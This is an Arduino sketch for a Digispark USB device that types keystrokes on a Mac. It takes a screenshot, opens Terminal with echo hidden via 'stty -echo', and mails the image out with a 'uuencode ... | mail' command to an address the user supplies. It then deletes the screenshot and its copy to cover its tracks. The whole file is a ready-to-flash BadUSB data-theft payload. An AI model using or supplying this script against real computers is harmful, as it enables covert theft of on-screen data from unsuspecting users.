#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

bool finished = false;
void loop() {
  if (not finished) {
    DigiKeyboard.sendKeyStroke(0);

    // Cmd + Shift + 3 -> take screenshot
    DigiKeyboard.sendKeyStroke(32, MOD_SHIFT_LEFT | MOD_GUI_LEFT);
    DigiKeyboard.delay(2000);

    // Open Finder
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("Finder");
    DigiKeyboard.delay(250);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);

    // Go to Desktop Folder
    // Cmd + Shift + D -> shortcut to go to the Desktop folder
    DigiKeyboard.sendKeyStroke(KEY_D, MOD_SHIFT_LEFT | MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);

    // Switch to Cover Flow view
    // Cmd + 4 -> shortcut to switch to Cover Flow view
    DigiKeyboard.sendKeyStroke(33, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);

    // Open the first file
    // Cmd + O -> shortuct to open file
    DigiKeyboard.sendKeyStroke(KEY_O, MOD_GUI_LEFT);
    DigiKeyboard.delay(1500);

    // Duplicate the file and rename it as 'screenshot_1'
    // Cmd + Shift + S -> shortcut to duplicate file
    DigiKeyboard.sendKeyStroke(KEY_S, MOD_SHIFT_LEFT | MOD_GUI_LEFT);
    DigiKeyboard.delay(2500);
    DigiKeyboard.print("screenshot_1");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    // Close file
    DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);

    // Open Terminal
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("terminal");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);

    // Disable terminal echoing
    DigiKeyboard.print("stty -echo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    // Change to Desktop
    DigiKeyboard.print("cd Desktop");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    // Use mail to send the screenshot
    DigiKeyboard.print("uuencode screenshot_1.png s1.png | mail -s ");
    // Can't type " so have to use code (52)
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.print("Test image");
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    // ** replace the email below with your own email **
    DigiKeyboard.print(" myemail@email.co");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);

    // Re-enable terminal echoing
    DigiKeyboard.print("stty echo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    
    // Quit Terminal
    DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);

    // Switch back to Finder
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("Finder");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);

    // Delete the screenshot and the duplicate
    //  We need to delete the currently-selected file and the one above it
    // Cmd + Backspace (usage ID code 42) -> Delete shortcut
    DigiKeyboard.sendKeyStroke(42, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    // Up arrow key -> usage ID code 82
    DigiKeyboard.sendKeyStroke(82);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(42, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    
    // Hide Finder
    DigiKeyboard.sendKeyStroke(KEY_H, MOD_GUI_LEFT);
    
    finished = true;
  }
}
